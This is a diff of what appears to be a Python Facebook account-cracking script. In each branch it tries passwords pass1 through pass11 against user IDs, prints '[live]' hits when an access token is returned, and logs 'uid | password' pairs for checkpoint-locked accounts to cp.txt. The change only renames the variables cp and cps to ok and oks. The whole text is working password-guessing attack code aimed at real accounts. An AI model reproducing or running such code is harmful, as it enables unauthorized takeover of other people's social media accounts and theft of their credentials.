@@ -288,10 +288,10 @@ def b_menu_select():
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
 		        print("\x1b[1;31m[Check] "+uid+" | "+pass1)
-		        cp=open("cp.txt","a")
-		        cp.write(uid+" | "+pass1+"\n")
-		        cp.close()
-		        cps.append(uid)
+		        ok=open("cp.txt","a")
+		        ok.write(uid+" | "+pass1+"\n")
+		        ok.close()
+		        oks.append(uid)
 		    else:
 		    	if "access_token" in d:
 		            print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass1+"\x1b[1;37m")
@@ -305,10 +305,10 @@ def b_menu_select():
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
 		                print("\x1b[1;31m[Check] "+uid+" | "+pass2)
-		                cp=open("cp.txt","a")
-		                cp.write(uid+" | "+pass2+"\n")
-		                cp.close()
-		                cps.append(uid)
+		                ok=open("cp.txt","a")
+		                ok.write(uid+" | "+pass2+"\n")
+		                ok.close()
+		                oks.append(uid)
 		            else:
 		                if 'access_token' in d:
 		                    print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass2+"\x1b[1;37m")
@@ -322,10 +322,10 @@ def b_menu_select():
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
 		                        print("\x1b[1;31m[Check] "+uid+" | "+pass3)
-		                        cp=open("cp.txt","a")
-		                        cp.write(uid+" | "+pass3+"\n")
-		                        cp.close()
-		                        cps.append(uid)
+		                        ok=open("cp.txt","a")
+		                        ok.write(uid+" | "+pass3+"\n")
+		                        ok.close()
+		                        oks.append(uid)
 		                    else:
 		                        if 'access_token' in d:
 		                            print(" \x1b[1;32m[live] \033[1;32m"+uid+" | "+pass3+"\x1b[1;37m")
@@ -339,10 +339,10 @@ def b_menu_select():
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
 		                                print("\x1b[1;31m[Check] "+uid+" | "+pass4)
-		                                cp=open("cp.txt","a")
-		                                cp.write(uid+" | "+pass4+"\n")
-		                                cp.close()
-		                                cps.append(uid)
+		                                ok=open("cp.txt","a")
+		                                ok.write(uid+" | "+pass4+"\n")
+		                                ok.close()
+		                                oks.append(uid)
 		                            else:
 		                                if 'access_token' in d:
 		                                    print("\x1b[1;32m[Live] \033[1;32m"+uid+" | "+pass4+"\x1b[1;37m")
@@ -356,10 +356,10 @@ def b_menu_select():
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
 		                                        print("\x1b[1;31m[Check] "+uid+" | "+pass5)
-		                                        cp=open("cp.txt","a")
-		                                        cp.write(uid+" | "+pass5+"\n")
-		                                        cp.close()
-		                                        cps.append(uid)
+		                                        ok=open("cp.txt","a")
+		                                        ok.write(uid+" | "+pass5+"\n")
+		                                        ok.close()
+		                                        oks.append(uid)
 		                                    else:
 		                                        if 'access_token' in d:
 		                                            print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass5+"\x1b[1;37m")
@@ -390,10 +390,10 @@ def b_menu_select():
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
 		                                                        print("\x1b[1;31m[Check] "+uid+" | "+pass7)
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass7+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
+		                                                        ok=open("cp.txt","a")
+		                                                        ok.write(uid+" | "+pass7+"\n")
+		                                                        ok.close()
+		                                                        oks.append(uid)
 		                                                    else:
 		                                                        if 'access_token' in d:
 		                                                            print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass7+"\x1b[1;37m")
@@ -407,10 +407,10 @@ def b_menu_select():
 		                                                            d=json.loads(q)
 		                                                            if 'www.facebook.com' in d['error_msg']:
 		                                                                 print("\x1b[1;31m[Check] "+uid+" | "+pass8)
-		                                                                 cp=open("cp.txt","a")
-		                                                                 cp.write(uid+" | "+pass8+"\n")
-		                                                                 cp.close()
-		                                                                 cps.append(uid)
+		                                                                 ok=open("cp.txt","a")
+		                                                                 ok.write(uid+" | "+pass8+"\n")
+		                                                                 ok.close()
+		                                                                 oks.append(uid)
 		                                                            else:
 		                                                                if 'access_token' in d:
 		                                                                    print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass8+"\x1b[1;37m")
@@ -424,10 +424,10 @@ def b_menu_select():
 		                                                                    d=json.loads(q)
 		                                                                    if 'www.facebook.com' in d['error_msg']:
 		                                                                        print("\x1b[1;31m[Check] "+uid+" | "+pass9)
-		                                                                        cp=open("cp.txt","a")
-		                                                                        cp.write(uid+" | "+pass9+"\n")
-		                                                                        cp.close()
-		                                                                        cps.append(uid)
+		                                                                        ok=open("cp.txt","a")
+		                                                                        ok.write(uid+" | "+pass9+"\n")
+		                                                                        ok.close()
+		                                                                        oks.append(uid)
 		                                                                    else:
 		                                                                        if 'access_token' in d:
 		                                                                            print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass9+"\x1b[1;37m")
@@ -441,10 +441,10 @@ def b_menu_select():
 		                                                                            d=json.loads(q)
 		                                                                            if 'www.facebook.com' in d['error_msg']:
 		                                                                                print("\x1b[1;31m[Check] "+uid+" | "+pass10)
-		                                                                                cp=open("cp.txt","a")
-		                                                                                cp.write(uid+" | "+pass10+"\n")
-		                                                                                cp.close()
-		                                                                                cps.append(uid)
+		                                                                                ok=open("cp.txt","a")
+		                                                                                ok.write(uid+" | "+pass10+"\n")
+		                                                                                ok.close()
+		                                                                                oks.append(uid)
 		                                                                            else:
 		                                                                                if 'access_token' in d:
 		                                                                                    print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass10+"\x1b[1;37m")
@@ -458,10 +458,10 @@ def b_menu_select():
 		                                                                                    d=json.loads(q)
 		                                                                                    if 'www.facebook.com' in d['error_msg']:
 		                                                                                        print("\x1b[1;31m[Check] "+uid+" | "+pass11)
-		                                                                                        cp=open("cp.txt","a")
-		                                                                                        cp.write(uid+" | "+pass11+"\n")
-		                                                                                        cp.close()
-		                                                                                        cps.append(uid)
+		                                                                                        ok=open("cp.txt","a")
+		                                                                                        ok.write(uid+" | "+pass11+"\n")
+		                                                                                        ok.close()
+		                                                                                        oks.append(uid)
 		                                                                                    else:
 		                                                                                        if 'access_token' in d:
 		                                                                                            print("\x1b[1;32m[live] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
